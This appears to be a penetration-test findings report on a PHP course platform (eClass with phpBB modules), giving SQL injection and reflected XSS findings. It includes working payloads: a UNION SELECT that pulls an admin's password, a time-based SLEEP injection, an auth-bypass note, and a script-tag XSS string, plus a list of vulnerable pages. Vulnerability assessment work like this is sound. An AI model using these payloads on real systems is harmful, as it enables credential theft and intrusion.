# Security Rapport

## SQLi

### Tags
- Time-based -> T
- Boolean    -> B
- Union      -> U

### /modules/phpbb/
- `viewtopic.php`: ?topic=1&forum=1: topic param injectable: TBU
    -  **AND 12 = 13 ) UNION SELECT password, password FROM eclass.user WHERE username="drunkadmin" --+**

- `reply.php`: ?topic=1&forum=1: same as above.

- `newtopic.php`: ?subject=dasd&Dialog1=on&Dialog2=on&Dialog3=on&Dialog4=on&Dialog5=on&Dialog6=on&message=da&forum=1&submit=,
                    forum param injectable: TBU,
    - **subject=dasd&Dialog1=on&Dialog2=on&Dialog3=on&Dialog4=on&Dialog5=on&Dialog6=on&message=da&forum=-9196 UNION ALL SELECT CONCAT(0x7171767171,0x43586c6d6d437675427477685178697356526b754747774876676c514f4c616c454669716742744d,0x716b7a6271)-- -&submit=**


### /modules/auth/
- `newprof.php`: nom_form=1&prenom_form=1&userphone=6505550100&uname=Smith"`true`"&email_form=skipfish@example.com&usercomment=skipfish&department=`1 AND (SELECT 9259 FROM (SELECT(SLEEP(5)))ipgP)`&proflang=1&submit=Submit&auth=1

### /modules/dropbox/

### /modules/create_course

### /info_cours

### /modules/work

### /upgrade/
- `upgrade.php`: Auth bypass SQLi @ `login` param, horizontal privesc to admin,
                vulnerable function -> is_admin()::upgrade_functions.php


## XSS

### $_SERVER['PHP_SELF']

The site is tremendously vulnerable to XSS. By "trememndously" we mean that in every single location there is at least 1 XSS vector via `$_SERVER["PHP_SELF"]`. Because their is no sanitazation on this variable we can inject XSS payloads that get reflected in the site's source code onload. Payloads of the form `"><script> alert("DRAGONS")</script>` are a go. There are functions such as `lang_selections()`::baseTheme.php that carry this vuln with them, but also many other sites in the code that have the above mentioned functionality included.

### The rest
[v] adminannouncements.php
[v] edituser.php
[v] myagenda.php
[v] lostpass.php
[v] newprof.php
[v] newuserreq.php
[x] newuseradmin.php
[v] ldapnewuser.php
[x] ldapnewprofadmin.php
[v] messageList.php
[v] infocours.php
[v] dropbox_submit.php
[v] forum_admin.php
[v] create_course.php 
[v] profile.php
[v] editpost.php
[v] newtopic.php
[v] reply.php
[v] unregcours.php
[v] work.php
[v] adduser.php